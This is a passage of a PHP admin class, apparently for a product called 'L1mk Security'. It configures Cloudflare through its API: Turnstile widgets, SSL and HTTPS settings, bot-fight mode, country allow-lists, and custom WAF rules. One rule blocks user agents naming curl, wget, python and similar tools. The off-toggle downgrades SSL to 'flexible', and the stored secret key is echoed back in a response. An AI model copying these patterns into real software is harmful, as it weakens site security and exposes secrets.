            foreach ($json['result'] as $zone) {
                $zones[] = [
                    'id' => $zone['id'],
                    'name' => $zone['name'],
                    'account' => [
                        'id' => $zone['account']['id'],
                        'name' => $zone['account']['name']
                    ]
                ];
            }
            echo json_encode(['ok' => true, 'zones' => $zones]);
        } else {
            $error = $json['errors'][0]['message'] ?? 'Unknown Cloudflare Error';
            echo json_encode(['ok' => false, 'error' => $error]);
        }
    }

    private static function handleCreateTurnstileWidget() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }

        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $apiKey = trim((string)($data['cfApiKey'] ?? ''));
        $email = trim((string)($data['cfEmail'] ?? ''));
        $accountId = trim((string)($data['cfAccountId'] ?? ''));
        $mode = trim((string)($data['mode'] ?? 'invisible'));
        
        // Handle domains array or single string
        $domains = [];
        if (isset($data['domains']) && is_array($data['domains'])) {
            $domains = array_filter(array_map('trim', $data['domains']));
        } elseif (isset($data['domainName'])) {
            $domains = [trim((string)$data['domainName'])];
        }
        $domains = array_values(array_unique(array_filter($domains)));

        if (!$apiKey || !$accountId || empty($domains)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing required fields (API Key, Account ID, Domains)']);
            exit;
        }

        $isToken = (strlen($apiKey) >= 40 && strpos($apiKey, 'cfk_') === false);
        $headers = ["Content-Type: application/json"];
        if ($isToken) {
            $headers[] = "Authorization: Bearer $apiKey";
        } else {
            $headers[] = "X-Auth-Email: $email";
            $headers[] = "X-Auth-Key: $apiKey";
        }

        // Widget Name based on first domain + count
        $widgetName = 'L1mk Security - ' . $domains[0];
        if (count($domains) > 1) {
            $widgetName .= ' (+' . (count($domains) - 1) . ' others)';
        }

        $widgetData = [
            'name' => $widgetName,
            'domains' => $domains,
            'mode' => $mode,
            'region' => 'world'
        ];

        // Check for existing Site Key in Config
        $cfg = Config::load();
        $existingSiteKey = isset($cfg['cfSiteKey']) ? trim((string)$cfg['cfSiteKey']) : '';
        $existingSecretKey = isset($cfg['cfSecretKey']) ? trim((string)$cfg['cfSecretKey']) : '';
        
        $method = 'POST';
        $endpoint = "accounts/$accountId/challenges/widgets";
        $actionType = 'created';

        // If we have an existing key, try to update it first
        if ($existingSiteKey !== '') {
            $method = 'PUT';
            $endpoint = "accounts/$accountId/challenges/widgets/$existingSiteKey";
            $actionType = 'updated';
            // Secret key is not updatable via this endpoint usually, but domains/mode/name are
        }

        $url = "https://api.cloudflare.com/client/v4/$endpoint";
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($widgetData));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        
        $resp = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err = curl_error($ch);

        // Fallback: If update failed (e.g. key deleted or 404), create new one
        if ($method === 'PUT' && ($code === 404 || $code === 400)) {
            $method = 'POST';
            $endpoint = "accounts/$accountId/challenges/widgets";
            $url = "https://api.cloudflare.com/client/v4/$endpoint";
            $actionType = 'created (fallback)';
            
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($widgetData));
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            
            $resp = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $err = curl_error($ch);
        }

        if ($resp === false) {
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => 'Curl error: ' . $err]);
            exit;
        }

        $json = json_decode($resp, true);

        if ($code !== 200 || empty($json['success'])) {
            http_response_code(400);
            $errMsg = $json['errors'][0]['message'] ?? 'Unknown Cloudflare Error';
            echo json_encode(['ok' => false, 'error' => $errMsg, 'details' => $json]);
            exit;
        }

        $result = $json['result'];
        
        // Save to config immediately
        $cfg['cfSiteKey'] = $result['sitekey'];
        // Update secret only if provided (create) or we have it (update)
        if (isset($result['secret'])) {
            $cfg['cfSecretKey'] = $result['secret'];
        }
        $cfg['cfTurnstileEnabled'] = true;
        Config::save($cfg);

        echo json_encode([
            'ok' => true,
            'action' => $actionType,
            'siteKey' => $result['sitekey'],
            'secretKey' => $cfg['cfSecretKey'], // Return stored secret
            'mode' => $result['mode']
        ]);
    }

    private static function handleSyncCloudflare() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }

        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $apiKey = trim((string)($data['cfApiKey'] ?? ''));
        $email = trim((string)($data['cfEmail'] ?? ''));
        $zoneId = trim((string)($data['cfZoneId'] ?? ''));

        if (!$apiKey || !$zoneId) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing required credentials']);
            exit;
        }

        $isToken = (strlen($apiKey) >= 40 && strpos($apiKey, 'cfk_') === false);
        $headers = ["Content-Type: application/json"];
        if ($isToken) {
            $headers[] = "Authorization: Bearer $apiKey";
        } else {
            $headers[] = "X-Auth-Email: $email";
            $headers[] = "X-Auth-Key: $apiKey";
        }

        $cf = function($method, $endpoint) use ($headers) {
            $url = "https://api.cloudflare.com/client/v4/" . ltrim($endpoint, '/');
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            $resp = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            return ['code' => $code, 'body' => json_decode($resp, true)];
        };

        $results = [
            'cfSecurityEnabled' => false,
            'cfBotShield' => false,
            'cfUnderAttack' => false,
            'cfCountryBlockingEnabled' => false,
            'cfCountryRuleExists' => false,
            'cfAllowedCountries' => '',
            'raw' => []
        ];

        // 1. Check SSL/TLS and Always Use HTTPS
        $sslRes = $cf('GET', "zones/$zoneId/settings/ssl");
        $httpsRes = $cf('GET', "zones/$zoneId/settings/always_use_https");
        
        $sslValue = $sslRes['body']['result']['value'] ?? '';
        $httpsValue = $httpsRes['body']['result']['value'] ?? '';
        
        if (($sslValue === 'full' || $sslValue === 'strict') && $httpsValue === 'on') {
            $results['cfSecurityEnabled'] = true;
        }

        // 2. Check Security Level (Under Attack)
        $secLevelRes = $cf('GET', "zones/$zoneId/settings/security_level");
        $secLevel = $secLevelRes['body']['result']['value'] ?? '';
        if ($secLevel === 'under_attack') {
            $results['cfUnderAttack'] = true;
        }

        // 3. Check Bot Fight Mode and WAF Rules
        $botRes = $cf('GET', "zones/$zoneId/bot_management");
        $botValue = $botRes['body']['result']['fight_mode'] ?? false;
        
        $rulesRes = $cf('GET', "zones/$zoneId/rulesets");
        $hasRules = false;
        if ($rulesRes['code'] === 200 && !empty($rulesRes['body']['result'])) {
            foreach ($rulesRes['body']['result'] as $rs) {
                // Match the zone custom ruleset by phase+kind (same lookup as deployCountryBlocking),
                // NOT by name — deploy creates it as "L1mk Custom Rules".
                if (($rs['phase'] ?? '') === 'http_request_firewall_custom' && ($rs['kind'] ?? '') === 'zone') {
                    // Check if ruleset actually has rules
                    $rsId = $rs['id'];
                    $rsDetails = $cf('GET', "zones/$zoneId/rulesets/$rsId");
                    if ($rsDetails['code'] === 200 && !empty($rsDetails['body']['result']['rules'])) {
                        $hasRules = true;
                        // Check for Country Blocking Rule
                        foreach ($rsDetails['body']['result']['rules'] as $rule) {
                            if (($rule['description'] ?? '') === 'L1mk: Country Block (Allow Only)') {
                                $results['cfCountryRuleExists'] = true;
                                if (!empty($rule['enabled'])) {
                                    $results['cfCountryBlockingEnabled'] = true;
                                }
                                // Extract countries from expression: (not ip.geoip.country in {"US" "CA"})
                                if (preg_match('/ip\.geoip\.country in \{(.*?)\}/', $rule['expression'], $m)) {
                                    preg_match_all('/\b[A-Z]{2}\b/', $m[1], $mm);
                                    $results['cfAllowedCountries'] = implode(', ', array_values(array_unique($mm[0])));
                                }
                            }
                        }
                    }
                    break;
                }
            }
        }

        if ($botValue === true || $hasRules) {
            $results['cfBotShield'] = true;
        }

        echo json_encode(['ok' => true, 'results' => $results]);
    }

    private static function handleConfigureCloudflare() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }

        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $apiKey = trim((string)($data['cfApiKey'] ?? ''));
        $email = trim((string)($data['cfEmail'] ?? ''));
        $zoneId = trim((string)($data['cfZoneId'] ?? ''));
        
        // Granular flags
        $cfSecurityEnabled = !empty($data['cfSecurityEnabled']);
        $cfBotShield = !empty($data['cfBotShield']);
        $cfUnderAttack = !empty($data['cfUnderAttack']);
        $cfCountryBlockingEnabled = !empty($data['cfCountryBlockingEnabled']);
        $cfAllowedCountries = trim((string)($data['cfAllowedCountries'] ?? ''));
        $cfCountryOnly = !empty($data['cfCountryOnly']); // Country-block-only update: don't touch other settings

        if (!$apiKey || !$zoneId) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing required credentials']);
            exit;
        }

        $isToken = (strlen($apiKey) >= 40 && strpos($apiKey, 'cfk_') === false);
        $headers = ["Content-Type: application/json"];
        if ($isToken) {
            $headers[] = "Authorization: Bearer $apiKey";
        } else {
            $headers[] = "X-Auth-Email: $email";
            $headers[] = "X-Auth-Key: $apiKey";
        }

        $cf = function($method, $endpoint, $postData = null) use ($headers) {
            $url = "https://api.cloudflare.com/client/v4/" . ltrim($endpoint, '/');
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            
            if ($postData !== null) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
            }
            
            $resp = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            return ['code' => $code, 'body' => json_decode($resp, true)];
        };

        $results = ['success' => true, 'errors' => []];

        // Country-only updates must not touch any previously-configured settings
        if (!$cfCountryOnly) {
            // 1. SSL/HTTPS Configuration
            if ($cfSecurityEnabled) {
                $sslRes = $cf('PATCH', "zones/$zoneId/settings/ssl", ['value' => 'full']);
                $httpsRes = $cf('PATCH', "zones/$zoneId/settings/always_use_https", ['value' => 'on']);
                if ($sslRes['code'] !== 200) $results['errors'][] = 'SSL configuration failed';
                if ($httpsRes['code'] !== 200) $results['errors'][] = 'HTTPS configuration failed';
            } else {
                // Optional: Revert to flexible/off if disabled? 
                // Usually safer to leave as-is or revert to flexible. Let's revert for "toggle off" behavior.
                $cf('PATCH', "zones/$zoneId/settings/ssl", ['value' => 'flexible']);
                $cf('PATCH', "zones/$zoneId/settings/always_use_https", ['value' => 'off']);
            }

            // 2. Bot Fight Mode
            // Note: 'bot_management' endpoint requires Pro/Biz/Ent for some fields, but 'fight_mode' works for free/pro usually via this or settings
            if ($cfBotShield) {
                $botRes = $cf('PUT', "zones/$zoneId/bot_management", [
                    'enable_js' => true,
                    'fight_mode' => true
                ]);
                if ($botRes['code'] !== 200) {
                     // Fallback to settings endpoint
                     $settingsRes = $cf('PATCH', "zones/$zoneId/settings/bot_fight_mode", ['value' => 'on']);
                     if ($settingsRes['code'] !== 200) $results['errors'][] = 'Bot Fight Mode enable failed';
                }
            } else {
                $botRes = $cf('PUT', "zones/$zoneId/bot_management", [
                    'enable_js' => false,
                    'fight_mode' => false
                ]);
                if ($botRes['code'] !== 200) {
                     $settingsRes = $cf('PATCH', "zones/$zoneId/settings/bot_fight_mode", ['value' => 'off']);
                     // Don't error strictly here as it might already be off
                }
            }

            // 3. Security Level (Under Attack)
            $secLevel = $cfUnderAttack ? 'under_attack' : 'medium';
            $cf('PATCH', "zones/$zoneId/settings/security_level", ['value' => $secLevel]);

            // 4. Deploy Advanced WAF Rules (Auto-Setup)
            if ($cfBotShield) {
                self::deployWafRules($cf, $zoneId);
            }
        }

        // 5. Deploy Country Blocking
        self::deployCountryBlocking($cf, $zoneId, $cfCountryBlockingEnabled, $cfAllowedCountries);

        // Save configuration locally
        Config::saveMerged(Config::guardCredentials([
            'cfSecurityEnabled' => $cfSecurityEnabled,
            'cfBotShield' => $cfBotShield,
            'cfUnderAttack' => $cfUnderAttack,
            'cfCountryBlockingEnabled' => $cfCountryBlockingEnabled,
            'cfAllowedCountries' => $cfAllowedCountries,
            'cfEmail' => $email,
            'cfApiKey' => $apiKey,
            'cfZoneId' => $zoneId,
            'cfSiteKey' => $data['cfSiteKey'] ?? '',
            'cfSecretKey' => $data['cfSecretKey'] ?? '',
            'cfTurnstileEnabled' => !empty($data['cfTurnstileEnabled']),
            'cfAccountId' => $data['cfAccountId'] ?? ''
        ]));

        if (empty($results['errors'])) {
            echo json_encode(['ok' => true, 'message' => 'Cloudflare configuration updated']);
        } else {
            echo json_encode(['ok' => false, 'errors' => $results['errors']]);
        }
    }

    private static function deployCountryBlocking($cf, $zoneId, $enabled, $countriesStr) {
        // Enabled with no valid country codes = "no change": never create/delete anything
        $countries = [];
        if ($enabled) {
            preg_match_all('/\b[A-Z]{2}\b/', strtoupper($countriesStr), $m);
            $countries = array_values(array_unique($m[0]));
            if (empty($countries)) return;
        }

        $rulesets = $cf('GET', "zones/$zoneId/rulesets");
        $phase = 'http_request_firewall_custom';
        $rulesetId = null;

        if ($rulesets['code'] === 200 && !empty($rulesets['body']['result'])) {
            foreach ($rulesets['body']['result'] as $rs) {
                if ($rs['phase'] === $phase && $rs['kind'] === 'zone') {
                    $rulesetId = $rs['id'];
                    break;
                }
            }
        }

        if (!$rulesetId) {
            if (!$enabled) return;
            $payload = [
                'name' => 'L1mk Custom Rules',
                'kind' => 'zone',
                'phase' => $phase,
                'rules' => []
            ];
            $res = $cf('POST', "zones/$zoneId/rulesets", $payload);
            if ($res['code'] === 200) {
                $rulesetId = $res['body']['result']['id'];
            } else {
                return; 
            }
        }

        $ruleDescription = 'L1mk: Country Block (Allow Only)';
        $existingRules = $cf('GET', "zones/$zoneId/rulesets/$rulesetId");
        $currentRules = $existingRules['body']['result']['rules'] ?? [];
        $existingRuleId = null;
        
        foreach ($currentRules as $cr) {
            if (($cr['description'] ?? '') === $ruleDescription) {
                $existingRuleId = $cr['id'];
                break;
            }
        }

        if ($enabled) {
            $list = implode(' ', array_map(function($c){ return "\"$c\""; }, $countries));
            $expression = "(not ip.geoip.country in {{$list}})";
            
            $ruleData = [
                'description' => $ruleDescription,
                'expression' => $expression,
                'action' => 'block',
                'enabled' => true
            ];

            if ($existingRuleId) {
                $cf('PATCH', "zones/$zoneId/rulesets/$rulesetId/rules/$existingRuleId", $ruleData);
            } else {
                $cf('POST', "zones/$zoneId/rulesets/$rulesetId/rules", $ruleData);
            }
        } elseif ($existingRuleId) {
            $cf('DELETE', "zones/$zoneId/rulesets/$rulesetId/rules/$existingRuleId");
        }
    }

    private static function deployWafRules($cf, $zoneId) {
        // 1. Get existing rulesets to avoid duplicates
        $rulesets = $cf('GET', "zones/$zoneId/rulesets");
        $phase = 'http_request_firewall_custom';
        $rulesetId = null;

        if ($rulesets['code'] === 200 && !empty($rulesets['body']['result'])) {
            foreach ($rulesets['body']['result'] as $rs) {
                if ($rs['phase'] === $phase && $rs['kind'] === 'zone') {
                    $rulesetId = $rs['id'];
                    break;
                }
            }
        }

        // Define our rules
        $newRules = [
            [
                'description' => 'L1mk: Block Automated Tools',
                'expression' => '(http.user_agent contains "curl") or (http.user_agent contains "python") or (http.user_agent contains "wget") or (http.user_agent contains "go-http-client") or (http.user_agent contains "java")',
                'action' => 'block',
                'enabled' => true
            ],
            [
                'description' => 'L1mk: Challenge High Risk',
                'expression' => '(cf.threat_score gt 15)',
                'action' => 'managed_challenge',
                'enabled' => true
            ]
        ];

        if ($rulesetId) {
            // Update existing ruleset (append/update)
            // For simplicity, we create them if they don't exist by description
            $existingRules = $cf('GET', "zones/$zoneId/rulesets/$rulesetId");
            $currentRules = $existingRules['body']['result']['rules'] ?? [];
            
            foreach ($newRules as $rule) {
                $exists = false;
                foreach ($currentRules as $cr) {
                    if (($cr['description'] ?? '') === $rule['description']) {
                        $exists = true;
                        break;
                    }
                }
                
                if (!$exists) {
                    $cf('POST', "zones/$zoneId/rulesets/$rulesetId/rules", $rule);
                }
            }
        } else {
            // Create new ruleset with rules
            $payload = [
                'name' => 'L1mk Custom Rules',
                'kind' => 'zone',
                'phase' => $phase,
                'rules' => $newRules
            ];
            $cf('POST', "zones/$zoneId/rulesets", $payload);
        }
    }
}
